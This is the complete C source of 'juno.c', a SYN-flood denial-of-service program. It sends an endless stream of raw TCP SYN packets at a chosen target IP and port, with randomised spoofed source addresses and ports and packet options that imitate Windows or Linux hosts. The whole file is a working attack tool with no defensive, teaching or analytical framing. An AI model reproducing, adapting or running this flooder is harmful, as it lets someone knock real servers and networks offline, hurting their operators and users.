char about[] = "juno.c\n";

/* 
 for best results, compile with:
     gcc -O2 juno.c -o juno

*/

#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

#define USELESS_INFO
#define EMULATE_WINDOWS        /* EMULATE_WINDOWS or EMULATE_LINUX    */ 
#define RANDOMIZE_SOURCE_IP    /* random source ips                   */
#define RANDOMIZE_SOURCE_PORT  /* random source ports                 */
#undef DELAY 1000              /* microsecond delay, undef for none   */

/* nothing beyond here is useful to people who can't program */

#ifndef EMULATE_WINDOWS
# ifndef EMULATE_LINUX
#  define EMULATE_WINDOWS 1
# endif
#endif

struct syn {
   unsigned char verihl;
   unsigned char tos;
   unsigned short len;
   unsigned short id;
   unsigned short flg_ofs;
   unsigned char ttl;
   unsigned char proto;
   unsigned short ipsum;
   unsigned long src;
   unsigned long dst;
   unsigned short sport;
   unsigned short dport;
   unsigned long seq;
   unsigned long ack_seq;
   unsigned char offset;
   unsigned char flags;
   unsigned short win;
   unsigned short tcpsum;
   unsigned short urgptr;
#ifdef EMULATE_WINDOWS
   char opt[8];
#else
# ifdef EMULATE_LINUX
   char opt[20];
# endif
#endif
};

int resolve(char *name,unsigned long *ip) {   
   struct hostent *host;
   
   if ((*ip=inet_addr(name)) == INADDR_NONE) {
      if (!(host=gethostbyname(name))) return(-1);
      *ip=((struct in_addr *)host->h_addr)->s_addr;
   }
   return(0);
}

int getsock(void) {
   int s = socket(PF_INET,SOCK_RAW,6),one=1;

   if(s<1) return(0);
   if(setsockopt(s,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) return(0);   
   return(s);
}

int getport(char *s, unsigned short *out)
{
   char const *p;
   int n;
   
   if(!*s) return(-1);
   for (p=s;*p;p++) if(*p<'0'||*p>'9') return(-2);
   if(p-s>5) return(-3);
   if(((n=atoi(s))>65535) || (n<0)) return(4);
   *out=htons(n);
   return(0);
}

void prep_syn(struct syn *syn) {      
   syn->verihl          = 69;
   syn->len             = htons(sizeof(struct syn));
   syn->flg_ofs         = 64;
   syn->proto           = 6;
   syn->flags           = 2;
#ifdef EMULATE_WINDOWS
   syn->ttl             = 128;  
   syn->offset          = 112;   
   syn->win             = htons(8192);   
   syn->opt[0]          = 2;
   syn->opt[1]          = 4;
   syn->opt[2]          = 5;
   syn->opt[3]          = 0xB4;
   syn->opt[4]          = 1;
   syn->opt[5]          = 1;
   syn->opt[6]          = 4;
   syn->opt[7]          = 2;
#else
# ifdef EMULATE_LINUX
   syn->tos             = 16;  
   syn->ttl             = 64;   
   syn->offset          = 160;   
   syn->win             = htons(15536);
   syn->opt[0]          = 0x02;
   syn->opt[1]          = 0x04;
   syn->opt[2]          = 0x0F;
   syn->opt[3]          = 0x2C;
   syn->opt[4]          = 0x04;
   syn->opt[5]          = 0x02;
   syn->opt[6]          = 0x08;
   syn->opt[7]          = 0x0A;
   syn->opt[9]          = 0x05;
   syn->opt[10]         = 0x27;
   syn->opt[11]         = 0x2D;
   syn->opt[13]         = 0x05;
   syn->opt[14]         = 0x27;
   syn->opt[15]         = 0x2D;
   syn->opt[16]         = 0x01;
   syn->opt[17]         = 0x03;
   syn->opt[18]         = 0x03;
# endif
#endif   
}

int starttime,outcount=0;

int xmit_syn(struct syn *syn,int sock,struct sockaddr_in *targ) {
   register int count = (sizeof(struct syn)-20) >> 1,sum;
   register unsigned short *p = &syn->sport;
     
#ifdef RANDOMIZE_SOURCE_IP
   syn->src             = random();
#endif
   syn->id              = 1+255*((random()%256)|0xFF);
#ifdef RANDOMIZE_SOURCE_PORT
   syn->sport           = htons(1024 + (random() & 2048));
#endif
   syn->seq             = random();
   syn->ack_seq         = random();
   syn->tcpsum = 0;
   sum = (syn->src >> 16) + (syn->src & 0xffff) + (syn->dst >> 16) +
         (syn->dst & 0xffff) + 1536 + htons(count << 1);
   while(count--) sum += *p++;
   sum = (sum >> 16) + (sum & 0xffff);
   syn->tcpsum = ~(sum += (sum >> 16));

   outcount++;
   
   return(sendto(sock,syn,sizeof(struct syn),0,targ,sizeof(struct sockaddr_in)));
}
   
#ifdef RANDOMIZE_SOURCE_IP
# ifdef RANDOMIZE_SOURCE_PORT
#  define TARGET_IP_INDEX 1
# else
#  define SOURCE_PORT_INDEX 1
#  define TARGET_IP_INDEX 2
# endif
#else
# ifdef RANDOMIZE_SOURCE_PORT
#  define TARGET_IP_INDEX 2
# else
#  define SOURCE_PORT_INDEX 2
#  define TARGET_IP_INDEX 3
# endif
#endif

void sig_proc(int signum) {
   int ctime=time(NULL);
   printf("\n -- statistics -----------------------\n");
   printf("   packets sent:          %d\n",outcount);
   printf("   bytes sent:            %d\n",outcount * sizeof(struct syn));
   printf("   seconds active:        %d\n",ctime-starttime);
   printf("   average bytes/second:  %d\n",(outcount * sizeof(struct syn))/(ctime-starttime));
   printf(" -------------------------------------\n");
   exit(1);
}

int main(int argc,char *argv[]) {
   struct syn syn;
   struct sockaddr_in targ;
   int sock;

   bzero(&syn,sizeof(struct syn));
   
   if(argc<TARGET_IP_INDEX+2) {
      fprintf(stderr,"Syntax: %s ",argv[0]);
#ifndef RANDOMIZE_SOURCE_IP
      fprintf(stderr,"<source ip> ");
#endif
#ifndef RANDOMIZE_SOURCE_PORT
      fprintf(stderr,"<source port> ");
#endif
      fprintf(stderr,"<target ip> <target port>\n");
      exit(1);
   }
   
   if(!(sock=getsock())) {
      fprintf(stderr,"Failed to create socket\n");
      exit(2);
   }
   
#ifndef RANDOMIZE_SOURCE_IP
   if(resolve(argv[1],&syn.src)) { 
      fprintf(stderr,"Invalid source ip (%s)\n",argv[1]);
      exit(3);
   }
#endif
   
#ifndef RANDOMIZE_SOURCE_PORT
   if(getport(argv[SOURCE_PORT_INDEX],&syn.sport)) {
      fprintf(stderr,"Invalid source port (%s)\n",argv[SOURCE_PORT_INDEX]);
      exit(4);
   }
#endif
   
   if(resolve(argv[TARGET_IP_INDEX],&syn.dst)) {
      fprintf(stderr,"Invalid target ip (%s)\n",argv[TARGET_IP_INDEX]);
      exit(5);
   }
   
   if(getport(argv[TARGET_IP_INDEX+1],&syn.dport)) {
      fprintf(stderr,"Invalid target port (%s)\n",argv[TARGET_IP_INDEX+1]);
      exit(6);
   }

#ifdef USELESS_INFO
   printf("%s%s",about,"death");
# ifndef RANDOMIZE_SOURCE_IP
   printf(" from %s:",inet_ntoa(syn.src));
#  ifndef RANDOMIZE_SOURCE_PORT
   printf("%d",ntohs(syn.sport));
#  else
   printf("random ");  
#  endif
# else
#  ifndef RANDOMIZE_SOURCE_PORT
   printf("random:%d",ntohs(syn.sport));
#  endif
# endif
   printf(" to %s:%d\n",inet_ntoa(syn.dst),ntohs(syn.dport));
#endif
   targ.sin_addr.s_addr = syn.dst;
   targ.sin_port        = syn.dport;
   targ.sin_family      = AF_INET;

   srandom(time(NULL));

   starttime = time(NULL);
   while(time(NULL) == starttime) usleep(1000);

   signal(SIGHUP,&sig_proc);
   signal(SIGINT,&sig_proc);
   signal(SIGQUIT,&sig_proc);
   signal(SIGILL,&sig_proc);
   signal(SIGABRT,&sig_proc);
   signal(SIGFPE,&sig_proc);
//   signal(SIGKILL,&sig_proc);
   signal(SIGSEGV,&sig_proc);
   signal(SIGPIPE,&sig_proc);
   signal(SIGALRM,&sig_proc);
   signal(SIGTERM,&sig_proc);
   signal(SIGUSR1,&sig_proc);
   signal(SIGUSR2,&sig_proc);
   signal(SIGCHLD,&sig_proc);
   signal(SIGCONT,&sig_proc);
//   signal(SIGSTOP,&sig_proc);
   signal(SIGTSTP,&sig_proc);
   signal(SIGTTIN,&sig_proc);
   signal(SIGTTOU,&sig_proc);
   
   prep_syn(&syn);
   while(1) {
      if(xmit_syn(&syn,sock,&targ)!=sizeof(struct syn)) {
	 fprintf(stderr,"failed to send packet\n");
	 exit(7);
      }
#ifdef DELAY
      usleep(DELAY);
#endif
   }   
}